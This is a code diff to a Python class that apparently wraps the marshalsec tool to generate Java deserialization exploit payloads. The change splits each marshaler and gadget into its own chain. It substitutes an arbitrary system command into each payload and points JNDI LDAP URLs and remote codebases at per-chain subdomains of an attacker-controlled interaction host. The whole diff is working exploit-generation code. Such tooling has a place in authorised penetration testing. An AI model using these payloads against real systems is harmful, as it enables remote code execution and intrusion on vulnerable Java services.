@@ -125,13 +125,15 @@ class Marshalsec(Serializer):
     def chains(self):
         chains = []
         for marshaler, gadgets in self.marshalers.items():
-            chains.append({
-                'id': marshaler.lower(),
-                'name': marshaler,
-                'description': f"{marshaler}: {' | '.join(gadgets)}",
-                'gadgets': gadgets,
-                'output': self.marshalersFormats[marshaler],
-            })
+            for gadget in gadgets:
+                chains.append({
+                    'id': f"{marshaler.lower()}-{gadget.lower()}",
+                    'name': f"{marshaler}/{gadget}",
+                    'description': f"{marshaler}/{gadget}",
+                    'marshaler': marshaler,
+                    'gadget': gadget,
+                    'output': self.marshalersFormats[marshaler],
+                })
             
         return chains
 
@@ -157,54 +159,54 @@ class Marshalsec(Serializer):
                 logging.debug(f"[{chain['name']}] Skipping chain of format '{chain['output']}'")
                 continue
 
-            for gadget in chain['gadgets']:
+            gadget = chain['gadget']
+            marshaler = chain['marshaler']
 
-                format = self.payloadFormats[gadget]
+            format = self.payloadFormats[gadget]
 
-                if ('<jndiUrl>' in format or '<codebase>' in format or '<service_codebase>' in format) and not interact_domain:
-                    logging.warning(f"[{chain['name']}] Skipping payload with gadget {gadget} because it requires an interact domain")
-                    continue
-    
-                logging.info(f"[{chain['name']}] Generating payload with gadget '{gadget}'")
+            if ('<jndiUrl>' in format or '<codebase>' in format or '<service_codebase>' in format) and not interact_domain:
+                logging.warning(f"[{chain['name']}] Skipping payload with gadget {gadget} because it requires an interact domain")
+                continue
 
-                chain_system_command = system_command
-                chain_system_command = chain_system_command.replace('%%chain_id%%', chain['id'])
-                chain_system_command = chain_system_command.replace('%%domain%%', str(interact_domain))
-                escaped_chain_system_command = chain_system_command.replace("'", "\\'")
+            logging.info(f"[{chain['name']}] Generating payload with gadget '{gadget}'")
 
-                chainArguments = format
-                chainArguments = chainArguments.replace('<system_command>', escaped_chain_system_command)
-                chainArguments = chainArguments.replace('<class>', f"{chain['name']}{gadget}")
-                chainArguments = chainArguments.replace('<classname>', f"{chain['name']}{gadget}")
-                chainArguments = chainArguments.replace('<jndiUrl>', f"ldap://{interact_domain}/{chain['name']}{gadget}")
-                chainArguments = chainArguments.replace('<codebase>', f"https://{interact_domain}/")
-                chainArguments = chainArguments.replace('<service_codebase>', f"https://{interact_domain}/{chain['name']}{gadget}")
-                chainArguments = chainArguments.replace('<host>', str(interact_domain))
-                chainArguments = chainArguments.replace('<port>', '443')
+            chain_system_command = system_command
+            chain_system_command = chain_system_command.replace('%%chain_id%%', chain['id'])
+            chain_system_command = chain_system_command.replace('%%domain%%', str(interact_domain))
+            escaped_chain_system_command = chain_system_command.replace("'", "\\'")
 
-                chainArguments = f"{gadget} {chainArguments}"
-                result = self.payload("marshalsec."+chain['name'], chainArguments)
-                    
-                if result.returncode != 0 or result.stdout.strip() == b'':
-                    logging.error(f"[{chain['name']}] Failed to create payload")
-                    if result.stdout != b'':
-                        logging.error(result.stdout.decode('ascii'))
-                        pass
-                    logging.error(result.stderr.decode('ascii'))
-                    continue
+            chainArguments = format
+            chainArguments = chainArguments.replace('<system_command>', escaped_chain_system_command)
+            chainArguments = chainArguments.replace('<class>', f"{marshaler}{gadget}")
+            chainArguments = chainArguments.replace('<classname>', f"{marshaler}{gadget}")
+            chainArguments = chainArguments.replace('<jndiUrl>', f"ldap://{chain['id']}.{interact_domain}/{marshaler}{gadget}")
+            chainArguments = chainArguments.replace('<codebase>', f"https://{chain['id']}.{interact_domain}/")
+            chainArguments = chainArguments.replace('<service_codebase>', f"https://{chain['id']}.{interact_domain}/{marshaler}{gadget}")
+            chainArguments = chainArguments.replace('<host>', f"{chain['id']}.{interact_domain}")
+            chainArguments = chainArguments.replace('<port>', '443')
 
-                payload = result.stdout
-
-                logging.debug(f"[{chain['name']}] Payload generated with {len(payload)} bytes")
-
-                # binary output can be encoded
-                if chain['output'] != 'binary':
-                    # clean string style formatters to have 1 payload per line
-                    if not self.chainOpts.one_file_per_payload:
-                        payload = payload.decode('utf-8').replace('\r', '').replace('\n', '').encode('utf-8')
+            chainArguments = f"{gadget} {chainArguments}"
+            result = self.payload("marshalsec."+marshaler, chainArguments)
                 
-                chainUniqueId = f"{chain['id']}_{gadget.lower()}"
-                self.output(chainUniqueId, payload+b"\n")
-                count = count + 1
-                
+            if result.returncode != 0 or result.stdout.strip() == b'':
+                logging.error(f"[{chain['name']}] Failed to create payload")
+                if result.stdout != b'':
+                    logging.error(result.stdout.decode('ascii'))
+                    pass
+                logging.error(result.stderr.decode('ascii'))
+                continue
+
+            payload = result.stdout
+
+            logging.debug(f"[{chain['name']}] Payload generated with {len(payload)} bytes")
+
+            # binary output can be encoded
+            if chain['output'] != 'binary':
+                # clean string style formatters to have 1 payload per line
+                if not self.chainOpts.one_file_per_payload:
+                    payload = payload.decode('utf-8').replace('\r', '').replace('\n', '').encode('utf-8')
+            
+            self.output(chain['id'], payload+b"\n")
+            count = count + 1
+            
         return count
